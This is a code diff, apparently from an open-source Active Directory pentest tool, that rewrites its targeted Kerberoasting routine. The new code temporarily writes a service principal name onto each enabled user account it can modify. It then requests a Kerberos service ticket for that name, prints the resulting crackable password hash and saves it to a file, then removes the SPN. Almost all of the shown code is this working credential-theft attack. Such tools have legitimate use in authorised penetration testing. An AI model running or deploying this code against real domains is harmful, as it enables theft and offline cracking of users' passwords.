@@ -4,7 +4,6 @@ import hashlib
 import hmac
 import os
 import socket
-import ldap3
 from errno import EHOSTUNREACH, ETIMEDOUT, ENETUNREACH
 from binascii import hexlify
 from datetime import datetime
@@ -13,7 +12,6 @@ from zipfile import ZipFile
 from termcolor import colored
 from dns import resolver
 from dateutil.relativedelta import relativedelta as rd
-from ldap3 import MODIFY_REPLACE
 
 from Cryptodome.Hash import MD4
 from OpenSSL.SSL import SysCallError
@@ -34,7 +32,7 @@ from impacket.krb5.types import Principal, KerberosException
 from impacket.ldap import ldap as ldap_impacket
 from impacket.ldap import ldaptypes
 from impacket.ldap import ldapasn1 as ldapasn1_impacket
-from impacket.ldap.ldap import LDAPFilterSyntaxError
+from impacket.ldap.ldap import LDAPFilterSyntaxError, MODIFY_REPLACE
 from impacket.smbconnection import SessionError
 from impacket.ntlm import getNTLMSSPType1
 
@@ -1166,79 +1164,105 @@ class ldap(connection):
                     self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")
     
     def targetedkerberoast(self):
-        # enumerate users without SPN
-        search_filter = "(&(objectCategory=person)(!(servicePrincipalName=*)))"
-        attrs = ["distinguishedName", "sAMAccountName", "userAccountControl"]
-        resp = parse_result_attributes(self.search(search_filter, attrs, 0))
-        if not resp:
-            self.logger.highlight("No users without SPN found.")
+
+        search_filter = "(&(objectCategory=person)(!(servicePrincipalName=*))(!(objectCategory=computer)))"
+        attributes = [
+            "distinguishedName",
+            "sAMAccountName",
+            "userAccountControl",
+            "MemberOf",
+            "pwdLastSet",
+            "lastLogon",
+        ]
+        resp = self.search(search_filter, attributes, 0)
+        resp_parsed = parse_result_attributes(resp)
+
+        if not resp_parsed:
+            self.logger.highlight("No entries found!")
             return
 
-        enabled = [u for u in resp if not int(u["userAccountControl"]) & 0x2]
+        disabled_accounts = [x for x in resp_parsed if int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
+        for account in disabled_accounts:
+            self.logger.display(f"Skipping disabled account: {account['sAMAccountName']}")
+
+        enabled = [x for x in resp_parsed if not int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
         self.logger.display(f"Found {len(enabled)} enabled users without SPN.")
 
-        # kerberos bind via ldap3
-        lmhash = nthash = ""
-        if self.args.hash:
-            h = self.args.hash[0] if isinstance(self.args.hash, list) else self.args.hash
-            if h:
-                parts = h.split(":", 1)
-                lmhash, nthash = parts if len(parts) == 2 else ("", parts[0])
+        results = []
+        for user in enabled:
+            dn = user["distinguishedName"]
+            sam = user["sAMAccountName"]
+            spn = f"cifs/{sam}"
+            downLevelLogonName = f"{self.targetDomain}\\{sam}"
 
-        ok, conn = self.ldap3_kerberos_login(
-            user=self.username or "",
-            password=self.password or "",
-            lmhash=lmhash,
-            nthash=nthash,
-            aes_key=self.args.aesKey[0] if self.args.aesKey else "",
-            kdcHost=self.kdcHost,
-            useCache=bool(self.args.use_kcache),
-        )
-        if not ok:
-            self.logger.fail("Kerberos bind failed.")
+            try:
+                # Add temporary SPN
+                self.ldap_connection.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [spn])]})
+                self.logger.debug(f"SPN '{spn}' added for {sam}")
+
+                try:
+                    TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
+                    self.logger.debug(f"TGT: {TGT}")
+                    if TGT:
+                        principalName = Principal()
+                        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
+                        principalName.components = [downLevelLogonName]
+
+                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+                            principalName,
+                            self.domain,
+                            self.kdcHost,
+                            TGT["KDC_REP"],
+                            TGT["cipher"],
+                            TGT["sessionKey"],
+                        )
+
+                        hash_line = KerberosAttacks(self).output_tgs(tgs, oldSessionKey, sessionKey, sam, downLevelLogonName)
+                        pwdLastSet = "<never>" if str(user.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["pwdLastSet"]))))
+                        lastLogon = "<never>" if str(user.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["lastLogon"]))))
+
+                        results.append({
+                            "sam": sam,
+                            "memberOf": user.get("memberOf", []),
+                            "pwdLastSet": pwdLastSet,
+                            "lastLogon": lastLogon,
+                            "hash": hash_line,
+                        })
+                    else:
+                        self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")
+
+                finally:
+                    try:
+                        self.ldap_connection.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [])]})
+                        self.logger.debug(f"SPN removed for {sam}")
+                    except Exception as cleanup_error:
+                        self.logger.debug(f"Failed to remove SPN for {sam}: {cleanup_error}")
+
+            except ldap_impacket.LDAPSessionError as e:
+                error_str = str(e)
+                if "insufficientAccessRights" in error_str or "INSUFF_ACCESS_RIGHTS" in error_str:
+                    self.logger.debug(f"No write access to {sam}'s SPN attribute")
+                else:
+                    self.logger.fail(f"LDAP error for {sam}: {e}")
+                    self.logger.debug("Traceback", exc_info=True)
+
+            except Exception as e:
+                self.logger.debug(f"Exception: {e}", exc_info=True)
+                self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
+
+        if not results:
+            self.logger.highlight("No entries found!")
             return
 
-        hashes, logs, success = [], [], []
-        for u in enabled:
-            dn = u["distinguishedName"]
-            sam = u["sAMAccountName"]
-            spn = f"test/{sam}"
-            try:
-                if not conn.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [spn])] }):
-                    logs.append(("debug", f"Failed to add SPN for {sam}: {conn.result}"))
-                    continue
-                logs.append(("success", f"SPN added successfully for {sam}"))
+        self.logger.display(f"Total of records returned {len(results):d}")
 
-                tgt = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
-                if not tgt:
-                    logs.append(("fail", f"No TGT for {sam}"))
-                    continue
+        for result in results:
+            self.logger.display(f"sAMAccountName: {result['sam']}, memberOf: {result['memberOf']}, pwdLastSet: {result['pwdLastSet']}, lastLogon: {result['lastLogon']}")
+            self.logger.highlight(result["hash"])
 
-                princ = Principal(); princ.type = constants.PrincipalNameType.NT_SRV_INST.value
-                princ.components = spn.split("/")
-                tgs, cipher, old_sk, sk = getKerberosTGS(
-                    princ, self.domain, self.kdcHost,
-                    tgt["KDC_REP"], tgt["cipher"], tgt["sessionKey"]
-                )
-                h = KerberosAttacks(self).output_tgs(tgs, old_sk, sk, sam, spn)
-                hashes.append(h); success.append((dn, sam)); logs.append(("highlight", h))
-
-                if self.args.targetedkerberoast:
-                    with open(self.args.targetedkerberoast, "a", encoding="utf-8") as f:
-                        f.write(h + "\n")
-
-                if conn.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [])]}):
-                    logs.append(("success", f"SPN removed successfully for {sam}"))
-                else:
-                    logs.append(("debug", f"Failed to remove SPN for {sam}: {conn.result}"))
-            except Exception as e:
-                logs.append(("fail", f"Error for {sam}: {e}"))
-                self.logger.debug("Traceback", exc_info=True)
-
-        self.logger.display(f"Total of records returned: {len(success)}")
-        for lvl, msg in logs:
-            getattr(self.logger, lvl)(msg)
-        conn.unbind()
+            if self.args.targetedkerberoast:
+                with open(self.args.targetedkerberoast, "a+", encoding="utf-8") as f:
+                    f.write(result["hash"] + "\n")
 
     def query(self):
         """
